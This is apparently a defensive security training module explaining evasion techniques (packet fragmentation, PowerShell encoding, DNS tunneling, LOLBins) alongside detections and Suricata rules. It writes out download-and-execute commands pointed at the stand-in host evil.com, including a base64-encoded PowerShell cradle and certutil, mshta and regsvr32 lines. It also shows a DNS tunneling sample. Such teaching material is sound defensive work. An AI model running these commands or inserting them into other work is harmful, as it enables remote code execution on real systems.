# E — Evasion Detection

## Beginner Explanation
Attackers don't just attack — they also try to hide their attacks from security tools. Evasion techniques are the tricks adversaries use to slip past IDS, AV, and firewalls. Defenders must understand these techniques so they can build detections that cannot be easily fooled.

## Technical Deep Dive

### Common Evasion Techniques

#### 1. Packet Fragmentation
Splitting malicious payloads across multiple small IP fragments so no single packet contains a complete signature.
```
Normal:   [SYN][GET /evil.php?cmd=whoami HTTP/1.1]
Fragmented: [SYN][GET /evil.p][hp?cmd=w][hoami HTTP/1.1]
```
**Defense:** Configure IDS/IPS to reassemble fragments before inspection (Suricata does this by default with `defrag: yes`).

#### 2. Encoding and Obfuscation
```
# Clear text (detected by simple signature)
powershell -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"

# Base64 encoded (evades simple string matching)
powershell -EncodedCommand SW52b2tlLUV4cHJlc3Npb24gKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9ldmlsLmNvbS9wYXlsb2FkLnBzMScpCg==
```
**Defense:** Enable PowerShell Script Block Logging — Windows deobfuscates before logging, capturing the real command regardless of encoding.

#### 3. Protocol Tunneling
Hiding malicious traffic inside legitimate protocols (DNS, ICMP, HTTPS).
```
DNS Tunneling: Encoding C2 commands in DNS query subdomains
  command: whoami
  encoded: d2hvYW1p.attacker-c2.com (base64 in subdomain)
```
**Defense:** Monitor for unusually long DNS query names, high DNS query rates per host, or DNS to uncommon resolvers.

#### 4. Living-off-the-Land (LOL) Techniques
Using legitimate OS tools to avoid detection (no malware binary needed):
```powershell
# LOLBin abuse — certutil to download payload
certutil -urlcache -split -f http://evil.com/payload.exe C:\temp\payload.exe

# mshta to execute remote script
mshta http://evil.com/evil.hta

# regsvr32 to execute remote COM scriptlet
regsvr32 /s /n /u /i:http://evil.com/script.sct scrobj.dll
```
**Defense:** Alert on certutil, mshta, regsvr32 making network connections. Use AppLocker/WDAC to restrict these binaries.

#### 5. Polymorphic and Metamorphic Malware
Code that changes its binary signature on each execution while preserving functionality, evading signature-based AV.
**Defense:** Behavioral detection (what does it DO, not what does it LOOK LIKE).

### Detecting Evasion Attempts

```yaml
# Suricata rule: Detect Base64 in DNS query (possible tunneling)
alert dns $HOME_NET any -> any 53 \
    (msg:"DETECT Possible DNS Tunneling Base64 Encoded Query"; \
     dns.query; pcre:"/^[A-Za-z0-9+\/]{30,}={0,2}\./"; \
     classtype:bad-unknown; sid:9000020; rev:1;)

# Suricata rule: Detect certutil network download
alert http $HOME_NET any -> $EXTERNAL_NET any \
    (msg:"DETECT certutil Download Cradle"; \
     flow:to_server,established; \
     http.user_agent; content:"CertUtil"; \
     classtype:trojan-activity; sid:9000021; rev:1;)
```

## Real-World Relevance
**APT29 (Cozy Bear):** Russian state actors used DNS-over-HTTPS tunneling in the SolarWinds operation to blend C2 traffic with legitimate encrypted DNS queries, making detection significantly harder. Only behavioral analysis of traffic patterns (beaconing intervals, domain entropy) enabled detection.

## Defensive Measures
1. Deploy behavioral detection (EDR) not just signature-based AV
2. Enable full packet inspection with fragment reassembly in your IDS
3. Enable PowerShell Script Block Logging to capture deobfuscated commands
4. Alert on LOLBin network connections (certutil, mshta, regsvr32, wscript making HTTP calls)
5. Monitor DNS for high-entropy subdomains and abnormally high query rates

## Practice Challenge
1. In a lab, capture PowerShell executing an encoded command with Script Block Logging enabled.
2. Locate Event ID 4104 in Windows Event Viewer — note that the decoded command is logged.
3. Write a Suricata rule that detects `-EncodedCommand` in HTTP user-agent or URI strings.
4. Research three additional LOLBins not listed here and document their legitimate purpose vs. abuse potential.
